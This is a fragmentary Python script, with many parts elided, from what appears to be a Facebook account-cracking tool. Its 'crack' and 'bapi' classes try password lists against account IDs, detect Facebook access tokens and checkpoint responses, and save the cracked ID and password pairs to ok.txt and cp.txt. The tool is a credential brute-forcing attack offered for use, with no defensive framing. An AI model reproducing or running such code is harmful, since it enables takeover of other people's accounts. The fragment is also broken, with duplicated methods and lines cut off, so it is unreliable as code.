...
def banner():
    print("""\033[1;93m╔════════════════════════════════════════════════╗
\033[1;95m   _____ ____  __  _____    ________ 
  / ___// __ \/ / / /   |  /  _/ __ )\033[1;94m------\033[1;92mKHAN
  \033[1;95m\__ \/ / / / /_/ / /| |  / // __  |
 ___/ / /_/ / __  / ___ |_/ // /_/ / 
/____/\____/_/ /_/_/  |_/___/_____/---\033[1;96mHELPING-BOY
...
class crack:
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mAHMAD-OK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mAHMAD-CP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
			...
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					try:
						...
						ttl=tt["birthday"]
						print(("\r\x1b[0;33m[\x1b[0;37mAHMAD-CP\x1b[0;33m] %s • %s • %s          "%(fl.get("id"),i,ttl)))
					...
					print(("\r\x1b[0;33m[\x1b[0;37mAHMAD-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mAHMAD-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
...
class bapi:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m[\x1b[0;37mAHMAD-OK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;37mAHMAD-CP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    ...
    if self.setpw == False:
      ...
      for pw in fl["pw"]:
        ...
        try:
          ...
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mAHMAD-OK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mAHMAD-CP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;37mAHMAD-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
